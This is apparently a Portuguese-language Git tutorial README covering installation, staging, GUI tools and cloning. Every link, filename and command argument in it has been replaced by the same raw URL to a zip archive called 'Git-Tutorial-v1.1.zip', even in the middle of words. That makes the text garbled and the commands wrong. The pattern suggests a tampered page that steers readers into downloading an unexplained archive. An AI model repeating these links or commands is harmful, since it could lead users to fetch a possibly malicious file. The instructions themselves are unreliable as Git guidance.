...
No [vídeo anterior](https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip) eu expliquei os conceitos de alguns termos técnicos que utilizamos quando estamos usando o git, então [nesse vídeo](https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip) vou mostrar na prática como isso acontece.

## Instalando o GIT

* [Link com os downloads](https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip)
...
* Criar um novo arquivo `https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip`
...
* `git add https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip` para colocar o arquivo na área de stagging 

<img src="https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip">
...
Existem algumas [interfaces legais do git](https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip) que você pode fazer o download para poder visualizar de fato como está o projeto, o que foi alterado em cada commit, quando foi alterado etc.
...
* Além disso iremos criar um novo arquivo `https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip`, onde escreveremos `Esse é o arquivo onde desenvolverei o meu projeto`
...
* Vou então criar o arquivo, criar o `botãhttps://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip` "aqui eu crio o botão"
...
* O comando para puxar o projeto para a sua máquina é o `git clone https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip`
...
Recomendo sempre vocês darem uma olhada na [documentação do Git](https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip), pois qualquer dúvida que apareça pode ser respondida por lá na explicação

**Não esqueçam de deixar o like e se inscrever no [canal do Youtube](https://github.com/davicqueiroz/GitTutorial/raw/refs/heads/master/unnecessary/Git-Tutorial-v1.1.zip) ❤**
